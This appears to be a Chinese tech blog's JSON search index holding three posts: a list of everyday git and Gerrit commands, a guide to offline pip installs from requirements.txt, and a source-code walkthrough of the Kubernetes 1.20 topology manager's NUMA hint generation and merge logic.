HEAD:refs/for/develop git push -u origin develop:refs/for/develop ### 有时push会报错 按提示输入以下命令执行 gitdir=$(git rev-parse --git-dir); scp -p -P 29418 wangb.in@100.7.36.68:hooks/commit-msg ${gitdir}/hooks/ git commit --amend git push -u origin develop:refs/for/develop git log --graph --pretty=oneline --abbrev-commit git remote add gitlab git@100.2.50.206:AIStation/kube-batch.git git remote -v git branch -a #git checkout remotes/origin/develop git checkout --track origin/develop git checkout --track remotes/origin/custom-3.1-westlake-university # 新建本地分支 # git checkout –b feature git checkout -b feature/gpu-utility git checkout -b feat/log4j2-scan git checkout -b fix/coverity-dls git checkout -b fix/coverity-dls-3 git checkout -b feat/log-uuid git checkout -b fix/blackduck # 删除本地分支 git branch -d fix/remove-log4j2 # 提交本地分支 git commit -am \"feature: GPU负载, 代码优化\" git commit -am \"feat: 增加vlan调度\" git commit -am \"fix(pom模块): 删除log4j2\" git commit -am \"feat(test模块): log4j2扫描\" git commit -am \"fix(安全扫描): coverity-DLS 3\" #### 撤销commit，保持本地修改 git reset HEAD~ # git push gitlab feature git push origin feature/gpu-utility git push origin feat/log4j2-scan git push origin fix/coverity-dls git push origin fix/coverity-dls-3 git push origin feat/log-uuid # 把分支的代码 合入到develop分支 在gitlab上创建mr ## 删除远程分支 git push origin --delete fix/remove-log4j2-icbc ## 删除本地分支 git branch -D fix/remove-log4j2-icbc ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:19:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["开发"],"content":"参考资料 Git官网 Github 15分钟学习Git Git参考手册 Git简明手册 Git Magic Git Community Book 中文版 Pro Git 图解Git git-简明指南 learnGitBranching 在线学习工具 初级教程 廖雪峰的Git教程 蒋鑫老师将带你入github的大门 git详解 oschina教程 How to undo (almost) anything with Git撤销一切，汇总各种回滚撤销的场景，加强学习。 Git 教程 | 菜鸟教程runoob.com Git 本地仓库和裸仓库 沉浸式学 Git Git进阶用法，主要是rebase高级用法 成为一个git大师 高质量的Git中文教程 ","date":"2021-01-12","objectID":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/:20:0","tags":["Git"],"title":"[转载]一些 git 的常用命令","uri":"/posts/2021/01/%E8%BD%AC%E8%BD%BD%E4%B8%80%E4%BA%9B-git-%E7%9A%84%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"},{"categories":["Python"],"content":"python生成requirements.txt环境打包，利用requirements.txt离线安装Python环境","date":"2021-01-11","objectID":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/","tags":["Python"],"title":"python生成requirements.txt环境打包","uri":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/"},{"categories":["Python"],"content":"python生成requirements.txt环境打包，利用requirements.txt离线安装Python环境 ","date":"2021-01-11","objectID":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/:0:0","tags":["Python"],"title":"python生成requirements.txt环境打包","uri":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/"},{"categories":["Python"],"content":"python环境，pip安装的包写入requirements.txt #查看安装的包 pip list #把包写入到requirements.txt中 pip freeze \u003e requirements.txt ","date":"2021-01-11","objectID":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/:1:0","tags":["Python"],"title":"python生成requirements.txt环境打包","uri":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/"},{"categories":["Python"],"content":"pip3方式 pip3 list pip3 freeze \u003e requirements.txt ","date":"2021-01-11","objectID":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/:1:1","tags":["Python"],"title":"python生成requirements.txt环境打包","uri":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/"},{"categories":["Python"],"content":"离线安装 ","date":"2021-01-11","objectID":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/:2:0","tags":["Python"],"title":"python生成requirements.txt环境打包","uri":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/"},{"categories":["Python"],"content":"下载python环境pip包 在可连接外网的环境中，将requirements.txt中导入的包离线下载到packagesdir目录下 packagesdir=/home/wangb/pip3_packages pip3 download -i https://pypi.douban.com/simple -d $packagesdir -r requirements.txt #pip download -d $packagesdir -r requirements.txt ","date":"2021-01-11","objectID":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/:2:1","tags":["Python"],"title":"python生成requirements.txt环境打包","uri":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/"},{"categories":["Python"],"content":"离线安装下载包 将packagesdir下的下载包，拷贝到内网环境packagesdir目录下 拷贝requirements.txt 到内网环境 执行离线安装命令 packagesdir=/home/wangb/pip3_packages pip3 install --no-index --find-links=$packagesdir -r requirements.txt #pip install --no-index --find-links=$packagesdir -r requirements.txt ","date":"2021-01-11","objectID":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/:2:2","tags":["Python"],"title":"python生成requirements.txt环境打包","uri":"/posts/2021/01/python%E7%94%9F%E6%88%90requirements.txt%E7%8E%AF%E5%A2%83%E6%89%93%E5%8C%85/"},{"categories":["K8S"],"content":"基于K8S1.20的affinity topology feature源码分析","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"topology manager是k8s1.16版本以后kubelet中新增的子模块，并在1.18版本更新为beta版特性，按节点资源NUMA亲和性和插件资源自身拓扑亲和性策略，对作业和任务进行资源分配。本文k8s源码分析为1.20版本。 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:0:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"topology-manager设计方案 kubelet numa拓扑亲和性资源分配方案： Kubernetes Topology Manager Moves to Beta - Align Up! 设计方案中的资源拓扑分配例子如下： An example system with 2 NUMA nodes, 2 Sockets with 4 CPUs each, 2 GPUs, and 2 NICs. CPUs on Socket 0, GPU 0, and NIC 0 are all part of NUMA node 0. CPUs on Socket 1, GPU 1, and NIC 1 are all part of NUMA node 1. For example, consider the system in above, with the following two containers requesting resources from it: Container Name CPU GPU NIC Container0 2 1 1 Container1 2 1 1 If Container0 is the first container considered for allocation on the system, the following set of hints will be generated for the three topology-aware resource types in the spec. cpu: {{01: True}, {10: True}, {11: False}} gpu-vendor.com/gpu: {{01: True}, {10: True}} nic-vendor.com/nic: {{01: True}, {10: True}} With a resulting aligned allocation of: {cpu: {0, 1}, gpu: 0, nic: 0} When considering Container1 these resources are then presumed to be unavailable, and thus only the following set of hints will be generated: cpu: {{01: True}, {10: True}, {11: False}} gpu-vendor.com/gpu: {{10: True}} nic-vendor.com/nic: {{10: True}} With a resulting aligned allocation of: {cpu: {4, 5}, gpu: 1, nic: 1} Supporting device-specific constraints Currently, NUMA affinity is the only constraint considered by the TopologyManager for resource alignment. Moreover, the only scalable extensions that can be made to a TopologyHint involve node-level constraints, such as PCIe bus alignment across device types. It would be intractable to try and add any device-specific constraints to this struct (e.g. the internal NVLINK topology among a set of GPU devices). As such, we propose an extension to the device plugin interface that will allow a plugin to state its topology-aware allocation preferences, without having to expose any device-specific topology information to the kubelet. In this way, the TopologyManager can be restricted to only deal with common node-level topology constraints, while still having a way of incorporating device-specific topology constraints into its allocation decisions. Details of this proposal can be found here, and should be available as soon as Kubernetes 1.19. 说明：目前，NUMA affinity是kubelet的TopologyManager唯一的资源对齐的约束条件（对齐标准），而设备可扩展拓扑约束条件只有非节点级别的。 Add proposal for GetPreferredAllocation() to TopologyManager KEP This proposal adds an API to allow a device plugin to forward a “preferred allocation” to the devicemanager so it can incorporate this information into its allocation decisions. It leaves the devicemanager in charge of making the final allocation, but gives the plugin the chance to help influence it more directly. Using this new API call, the devicemanager will call out to a plugin at pod admission time, asking it for a preferred device allocation of a given size from a list of available devices. One call will be made per-container for each pod. The list of available devices passed to the GetPreferredAllocation() call do not necessarily match the full list of available devices on the system. Instead, the devicemanager treats the GetPreferredAllocation() call as a “last-level” filter on the set of devices it has to choose from after taking all TopologyHint information into consideration. As such, the list of available devices passed to this call will already be pre-filtered by the topology constraints encoded in the TopologyHint. As such, the preferred allocation is not guaranteed to be the allocation ultimately performed by the devicemanager. It is only designed to help the devicemanager make a more informed allocation decision when possible. When deciding on a preferred allocation, a device plugin will likely take internal topology-constraints into consideration, that the devicemanager is unaware of. A good example of this is the case of allocating pairs of NVIDIA GPUs that always include an NVLINK. On an 8 GPU machine, with a request for 2 GPUs, the best connected pairs by NVLINK might be: {{0,3}, {1,2}, {4,7}, {5,6}} Using GetPrefe","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:1:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"流程 在分析源码前，先整理画出相关流程时序图。便于总体理解业务流程。如下 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"资源管理组件创建和device plugin注册流程 这里以nvidia-k8s-deviceplugin为例，说明GPU设备注册流程 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:1","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"kubelet分配资源流程 kubelet根据topology manager计算资源拓扑亲和性，并由cpu manager分配cpu资源；device manager分配插件资源 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:2","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"主流程代码 kubelet/cm/topologymanager/scope_container.go func (s *containerScope) Admit(pod *v1.Pod) lifecycle.PodAdmitResult { if s.policy.Name() == PolicyNone { return s.admitPolicyNone(pod) } for _, container := range append(pod.Spec.InitContainers, pod.Spec.Containers...) { // bestHint, admit := s.calculateAffinity(pod, \u0026container) providersHints := s.accumulateProvidersHints(pod, container) bestHint, admit := s.policy.Merge(providersHints) if !admit { return topologyAffinityError() } if (s.podTopologyHints)[string(pod.UID)] == nil { (s.podTopologyHints)[string(pod.UID)] = make(map[string]TopologyHint) } klog.Infof(\"[topologymanager] Topology Affinity for (pod: %v container: %v): %v\", format.Pod(pod), container.Name, bestHint) (s.podTopologyHints)[string(pod.UID)][container.Name] = bestHint err := s.allocateAlignedResources(pod, \u0026container) if err != nil { return unexpectedAdmissionError(err) } } return admitPod() } 遍历pod中的所有容器 计算ProvidersHints，获取分配方案建议bestHint, 结果admit 按上面的对齐分配方案，为pod分配资源 参考数据结构 // Scope interface for Topology Manager type Scope interface { Name() string Admit(pod *v1.Pod) lifecycle.PodAdmitResult // AddHintProvider adds a hint provider to manager to indicate the hint provider // wants to be consoluted with when making topology hints AddHintProvider(h HintProvider) // AddContainer adds pod to Manager for tracking AddContainer(pod *v1.Pod, containerID string) error // RemoveContainer removes pod from Manager tracking RemoveContainer(containerID string) error // Store is the interface for storing pod topology hints Store } type scope struct { mutex sync.Mutex name string // Mapping of a Pods mapping of Containers and their TopologyHints // Indexed by PodUID to ContainerName podTopologyHints podTopologyHints // The list of components registered with the Manager hintProviders []HintProvider // Topology Manager Policy policy Policy // Mapping of PodUID to ContainerID for Adding/Removing Pods from PodTopologyHints mapping podMap map[string]string } // 格式: map[string(pod.UID)][container.Name]TopologyHint type podTopologyHints map[string]map[string]TopologyHint // TopologyHint is a struct containing the NUMANodeAffinity for a Container type TopologyHint struct { NUMANodeAffinity bitmask.BitMask // Preferred is set to true when the NUMANodeAffinity encodes a preferred // allocation for the Container. It is set to false otherwise. Preferred bool } // HintProvider is an interface for components that want to collaborate to // achieve globally optimal concrete resource alignment with respect to // NUMA locality. type HintProvider interface { // GetTopologyHints returns a map of resource names to a list of possible // concrete resource allocations in terms of NUMA locality hints. Each hint // is optionally marked \"preferred\" and indicates the set of NUMA nodes // involved in the hypothetical allocation. The topology manager calls // this function for each hint provider, and merges the hints to produce // a consensus \"best\" hint. The hint providers may subsequently query the // topology manager to influence actual resource assignment. GetTopologyHints(pod *v1.Pod, container *v1.Container) map[string][]TopologyHint // GetPodTopologyHints returns a map of resource names to a list of possible // concrete resource allocations per Pod in terms of NUMA locality hints. GetPodTopologyHints(pod *v1.Pod) map[string][]TopologyHint // Allocate triggers resource allocation to occur on the HintProvider after // all hints have been gathered and the aggregated Hint is available via a // call to Store.GetAffinity(). Allocate(pod *v1.Pod, container *v1.Container) error } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:2:3","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"topology affinity hintProviders实际上为参与进行资源分配的资源管理器，其扩展topo计算接口，目前使用的是cpumanger和devicemanager cpumanger用于管理分配cpu资源，比如按static策略分配cpuset devicemanager用于管理分配k8s可扩展资源，比如k8s-nvidia-gpu插件管理的gpu资源 func (s *containerScope) accumulateProvidersHints(pod *v1.Pod, container *v1.Container) []map[string][]TopologyHint { var providersHints []map[string][]TopologyHint // hintProviders实际上为参与进行资源分配的资源管理器，其扩展topo计算接口，目前使用的是cpumanger和devicemanager for _, provider := range s.hintProviders { // Get the TopologyHints for a Container from a provider. hints := provider.GetTopologyHints(pod, container) providersHints = append(providersHints, hints) klog.Infof(\"[topologymanager] TopologyHints for pod '%v', container '%v': %v\", format.Pod(pod), container.Name, hints) } return providersHints } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:3:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"cpumanager cpumanager ：GetTopologyHints -\u003e m.policy.GetTopologyHints(m.state, pod, container)[staticPolicy.GetTopologyHints] -\u003e generateCPUTopologyHints(available, reusable, requested) 计算并返回cpu资源的TopologyHint列表信息 func (p *staticPolicy) GetTopologyHints(){ // Get a list of available CPUs. available := p.assignableCPUs(s) // Get a list of reusable CPUs (e.g. CPUs reused from initContainers). // It should be an empty CPUSet for a newly created pod. reusable := p.cpusToReuse[string(pod.UID)] // Generate hints. cpuHints := p.generateCPUTopologyHints(available, reusable, requested) // 返回cpu资源的TopologyHint列表信息 return map[string][]topologymanager.TopologyHint{ // \"cpu\" : [{01 true} {10 true} {11 false}] string(v1.ResourceCPU): cpuHints, } } 计算cpu Hints generateCPUTopologyHints func (p *staticPolicy) generateCPUTopologyHints(availableCPUs cpuset.CPUSet, reusableCPUs cpuset.CPUSet, request int) []topologymanager.TopologyHint { // Initialize minAffinitySize to include all NUMA Nodes. minAffinitySize := p.topology.CPUDetails.NUMANodes().Size() // 执行了具体计算topo hint的算法 bitmask.IterateBitMasks(topology.CPUDetails.NUMANodes().ToSlice(), call_back_func{}) // If they don't, then move onto the next combination. if numMatching \u003c request { return } // Loop back through all hints and update the 'Preferred' field based on // counting the number of bits sets in the affinity mask and comparing it // to the minAffinitySize. Only those with an equal number of bits set (and // with a minimal set of numa nodes) will be considered preferred. for i := range hints { // 选择bitmap最窄的NUMANode，Preferred = true if hints[i].NUMANodeAffinity.Count() == minAffinitySize { hints[i].Preferred = true } } // 返回hints结果集，形式如：[{01 true} {10 true} {11 false}] // Preferred 优选字段标识 该hint是否为优先考虑方案 return hints } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:4:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"devicemanager GetTopologyHints // GetTopologyHints implements the TopologyManager HintProvider Interface which // ensures the Device Manager is consulted when Topology Aware Hints for each // container are created. func (m *ManagerImpl) GetTopologyHints(pod *v1.Pod, container *v1.Container) map[string][]topologymanager.TopologyHint { // Garbage collect any stranded device resources before providing TopologyHints m.UpdateAllocatedDevices() // Loop through all device resources and generate TopologyHints for them.. deviceHints := make(map[string][]topologymanager.TopologyHint) for resourceObj, requestedObj := range container.Resources.Limits { resource := string(resourceObj) requested := int(requestedObj.Value()) // Only consider resources associated with a device plugin. // 只考虑device plugin的扩展资源 if m.isDevicePluginResource(resource) { // Only consider devices that actually container topology information. // 只考虑有拓扑信息的资源，比如按numa对齐的gpus if aligned := m.deviceHasTopologyAlignment(resource)!aligned { klog.Infof(\"[devicemanager] Resource '%v' does not have a topology preference\", resource) deviceHints[resource] = nil continue } // Get the list of available devices, for which TopologyHints should be generated. available := m.getAvailableDevices(resource) reusable := m.devicesToReuse[string(pod.UID)][resource] // Generate TopologyHints for this resource given the current // request size and the list of available devices. deviceHints[resource] = m.generateDeviceTopologyHints(resource, available, reusable, requested) } } return deviceHints } 计算device Hints generateDeviceTopologyHints func (m *ManagerImpl) generateDeviceTopologyHints(resource string, available sets.String, reusable sets.String, request int) []topologymanager.TopologyHint { // Initialize minAffinitySize to include all NUMA Nodes minAffinitySize := len(m.numaNodes) // Iterate through all combinations of NUMA Nodes and build hints from them. hints := []topologymanager.TopologyHint{} bitmask.IterateBitMasks(m.numaNodes, call_back_func{}) // Loop back through all hints and update the 'Preferred' field based on // counting the number of bits sets in the affinity mask and comparing it // to the minAffinity. Only those with an equal number of bits set will be // considered preferred. for i := range hints { if hints[i].NUMANodeAffinity.Count() == minAffinitySize { hints[i].Preferred = true } } return hints } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:5:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"merge hints ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"merge算法思想 merge思想，是把多种类型资源的topo hints（即下面中的每一行），合并为一个hint，合并算法为位与运算。 不同的topo policy实现，区别就在merge处理中，如下 func (p *nonePolicy) Merge(providersHints []map[string][]TopologyHint) (TopologyHint, bool) { return TopologyHint{}, p.canAdmitPodResult(nil) } func (p *bestEffortPolicy) Merge(providersHints []map[string][]TopologyHint) (TopologyHint, bool) { // 1. 遍历全部hint providers，收集全部的hint，到filteredProvidersHints列表中。 // 本质上，是把map数据，转换成二维列表[][]TopologyHint，目的便于后面的mergeFilteredHints处理 filteredProvidersHints := filterProvidersHints(providersHints) bestHint := mergeFilteredHints(p.numaNodes, filteredProvidersHints) admit := p.canAdmitPodResult(\u0026bestHint) return bestHint, admit } func (p *restrictedPolicy) Merge(providersHints []map[string][]TopologyHint) (TopologyHint, bool) { filteredHints := filterProvidersHints(providersHints) hint := mergeFilteredHints(p.numaNodes, filteredHints) admit := p.canAdmitPodResult(\u0026hint) return hint, admit } func (p *singleNumaNodePolicy) Merge(providersHints []map[string][]TopologyHint) (TopologyHint, bool) { filteredHints := filterProvidersHints(providersHints) // Filter to only include don't cares and hints with a single NUMA node. singleNumaHints := filterSingleNumaHints(filteredHints) bestHint := mergeFilteredHints(p.numaNodes, singleNumaHints) defaultAffinity, _ := bitmask.NewBitMask(p.numaNodes...) if bestHint.NUMANodeAffinity.IsEqual(defaultAffinity) { bestHint = TopologyHint{nil, bestHint.Preferred} } admit := p.canAdmitPodResult(\u0026bestHint) return bestHint, admit } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:1","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"mergeFilteredHints处理 func mergeFilteredHints(numaNodes []int, filteredHints [][]TopologyHint) TopologyHint { // Set the default affinity as an any-numa affinity containing the list // of NUMA Nodes available on this machine. defaultAffinity, _ := bitmask.NewBitMask(numaNodes...) // Set the bestHint to return from this function as {nil false}. // This will only be returned if no better hint can be found when // merging hints from each hint provider. bestHint := TopologyHint{defaultAffinity, false} // 计算merge结果 iterateAllProviderTopologyHints(filteredHints, call_back_func{}) return bestHint } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:2","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"mergePermutation处理 应用了向量叉积(Cross Product)，但只是组合排列，并未求和 permutation为iterateAllProviderTopologyHints中罗列出的各种资源类型的hints的全部排列 位与运算bitmask.And，计算besthint值mergedAffinity hint.Preferred 逻辑与关系，全部为true，则为true。否则为false // Merge a TopologyHints permutation to a single hint by performing a bitwise-AND // of their affinity masks. The hint shall be preferred if all hits in the permutation // are preferred. func mergePermutation(numaNodes []int, permutation []TopologyHint) TopologyHint { // Get the NUMANodeAffinity from each hint in the permutation and see if any // of them encode unpreferred allocations. preferred := true defaultAffinity, _ := bitmask.NewBitMask(numaNodes...) var numaAffinities []bitmask.BitMask for _, hint := range permutation { // Only consider hints that have an actual NUMANodeAffinity set. if hint.NUMANodeAffinity == nil { numaAffinities = append(numaAffinities, defaultAffinity) } else { numaAffinities = append(numaAffinities, hint.NUMANodeAffinity) } if !hint.Preferred { preferred = false } } // Merge the affinities using a bitwise-and operation. mergedAffinity := bitmask.And(defaultAffinity, numaAffinities...) // Build a mergedHint from the merged affinity mask, indicating if an // preferred allocation was used to generate the affinity mask or not. return TopologyHint{mergedAffinity, preferred} } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:6:3","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"bestHint kubelet会再次遍历merged hint，得出bestHint，最终按bestHint进行资源分配。 bestHint算法思想： 优选preference为true的merge hint，即mergedHint.Preferred: true 在相同preference条件下，优选长度最窄的NUMANodeAffinity（bitmap类型） 计算好bestHint后，并保存，为后面流程使用 (s.podTopologyHints)[string(pod.UID)][container.Name] = bestHint 小结： hints的合并流程：resource topo hints -\u003e merged hints -\u003e bestHint ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:7:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"算法函数 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:8:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"计算BitMasks 组合 资源单元的分配是一种寻找组合的算法 bits列表即为NUMANodes返回与资源(如cpu)相关联的所有NUMANode id列表 // IterateBitMasks iterates all possible masks from a list of bits, // issuing a callback on each mask. func IterateBitMasks(bits []int, callback func(BitMask)) { var iterate func(bits, accum []int, size int) iterate = func(bits, accum []int, size int) { if len(accum) == size { // 构建size个numa组的bits按位或得到的mask，比如size=2时，输出numa组id组合：{01,10,11} mask, _ := NewBitMask(accum...) // callback 会对获得的各种长度的numa node mask进程处理 callback(mask) return } // 组合，遍历可选numa的bits列表 for i := range bits { iterate(bits[i+1:], append(accum, bits[i]), size) } } // bits列表即为NUMANodes返回与资源(如cpu)相关联的所有NUMANode id列表，如：[0,1]或者[0,1,2...7]或者 [0,1,2,3....63] // 并枚举1到全部numa node长度的numa node id 组合 for i := 1; i \u003c= len(bits); i++ { iterate(bits, []int{}, i) } } IterateBitMasks是计算topo hint的关键函数，在cpumangager和devicemanager中都有使用 IterateBitMasks本质上是计算出了资源列表（bits选择列表）的全部组合（size大小），如：cpuset的各种组合；devices中gpus的各种组合 DFS算法 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:8:1","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"计算AllProviderTopologyHints 排列 不同资源类型的hits合并，是全排列算法 // Iterate over all permutations of hints in 'allProviderHints [][]TopologyHint'. // // This procedure is implemented as a recursive function over the set of hints // in 'allproviderHints[i]'. It applies the function 'callback' to each // permutation as it is found. It is the equivalent of: // // for i := 0; i \u003c len(providerHints[0]); i++ // for j := 0; j \u003c len(providerHints[1]); j++ // for k := 0; k \u003c len(providerHints[2]); k++ // ... // for z := 0; z \u003c len(providerHints[-1]); z++ // permutation := []TopologyHint{ // providerHints[0][i], // providerHints[1][j], // providerHints[2][k], // ... // providerHints[-1][z] // } // callback(permutation) func iterateAllProviderTopologyHints(allProviderHints [][]TopologyHint, callback func([]TopologyHint)) { // Internal helper function to accumulate the permutation before calling the callback. var iterate func(i int, accum []TopologyHint) iterate = func(i int, accum []TopologyHint) { // Base case: we have looped through all providers and have a full permutation. if i == len(allProviderHints) { callback(accum) return } // Loop through all hints for provider 'i', and recurse to build the // the permutation of this hint with all hints from providers 'i++'. for j := range allProviderHints[i] { iterate(i+1, append(accum, allProviderHints[i][j])) } } iterate(0, []TopologyHint{}) } ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:8:2","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"资源分配 ","date":"2021-01-05","objectID":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/:9:0","tags":["K8S"],"title":"K8S affinity topology feature源码分析","uri":"/posts/2021/01/k8s-affinity-topology-feature%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"categories":["K8S"],"content":"allocateAlignedResources // It would be better to implement this function in topologymanager instead of scope // but topologymanager do not track providers anymore func (s *scope) allocateAlignedResources(pod *v1.Pod, container *v1.Container) error { for _, provider := range s.hintProviders { err := provider.Allocate(pod, container) if err != nil { return err } } return nil } 